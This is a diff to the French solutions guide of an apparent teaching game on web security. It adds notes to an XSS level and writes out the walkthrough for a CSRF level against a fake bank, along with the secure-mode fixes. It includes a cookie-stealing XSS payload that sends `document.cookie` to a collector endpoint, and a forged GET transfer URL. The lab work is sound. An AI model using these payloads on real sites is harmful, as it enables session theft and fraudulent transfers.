@@ -72,7 +72,10 @@ rejoué sous une CSP posée par un middleware Nitro sur la page du niveau.
 1. Garder (ou republier) le message piégé du niveau 2 :
    `<img src=x onerror="fetch('/api/evil/collect?c='+document.cookie)">`.
 2. **CSP « Aucune »** : lancer la relecture du bot → le payload s'exécute, le
-   collecteur reçoit le cookie.
+   collecteur reçoit le cookie. Sur ce niveau, la session du bot ne contient
+   **pas** de flag (`ba_admin=session-admin-sans-flag`) : voler le cookie ne
+   suffit plus, le flag se gagne par la CSP. Le collecteur est vidé à chaque
+   relecture.
 3. **CSP « Rapport seul »** (`Content-Security-Policy-Report-Only`) : le payload
    s'exécute toujours, mais la console CSP affiche « ⚠ signalée ·
    script-src-attr ← inline » (rapport envoyé au `report-uri`).
@@ -94,7 +97,37 @@ rapport forgé).
 
 ## Niveau 4 — CSRF : « Le virement fantôme » (étape 5)
 
-_À compléter._
+**Faille** : la fausse banque (`src/server/levels/bank.ts`, session `ba_bank`)
+accepte en mode vulnérable un virement sur le **seul cookie de session**, et même
+par un simple `GET` — un changement d'état sur une requête « sûre ». La page piège
+est servie sur une **autre origine** (`GET /piege`, `src/server/routes/piege.get.ts`) :
+quand la banque est sur `http://localhost:<port>`, le piège est sur
+`http://127.0.0.1:<port>` (sites différents pour le navigateur, même serveur).
+
+Prérequis : lancer le jeu via `localhost` **ou** `127.0.0.1` (par ex.
+`npm run build && npm run preview`) pour disposer des deux origines.
+
+**Solution**
+1. Ouvrir `/niveaux/virement-fantome` sur `localhost` : le compte est approvisionné
+   (1000 €) et la session `ba_bank` est posée.
+2. Cliquer « Ouvrir la page piège ↗ » : elle s'ouvre sur `127.0.0.1`. À son
+   chargement, elle soumet un formulaire `GET` vers
+   `http://localhost:<port>/api/virement-fantome/virement?beneficiaire=PIRATE_CSRF&montant=500`.
+   Comme c'est une **navigation de premier plan**, le cookie `SameSite=Lax` part
+   encore vers la banque : le virement s'exécute.
+3. Le navigateur arrive sur le **reçu** servi par la banque, qui affiche le flag
+   (« ⚠ Virement frauduleux (CSRF) »). Le compte du niveau le montre aussi.
+
+Raccourci (et leçon) : appeler directement l'URL de virement `GET` depuis la barre
+d'adresse suffit — un endpoint qui change l'état sur un `GET` est la faille même.
+
+**En mode sécurisé** : le cookie `ba_bank` passe en `SameSite=Strict` (il ne quitte
+plus le site de la banque), un virement doit être un `POST` (le `GET` renvoie 405),
+l'en-tête `Origin` est vérifié côté serveur, et un **jeton anti-CSRF double submit**
+est exigé — le cookie `XSRF-TOKEN` (lisible par le script, posé par la banque) est
+recopié par Angular (`withXsrfConfiguration`) dans l'en-tête `X-XSRF-TOKEN`. La page
+piège, incapable de lire ce cookie ni de poser cet en-tête, est rejetée (403). Un
+virement **légitime** depuis la banque reste possible dans les deux modes.
 
 ## Niveau 5 — Secrets : « Le coffre qui fuit » (étape 6)
 
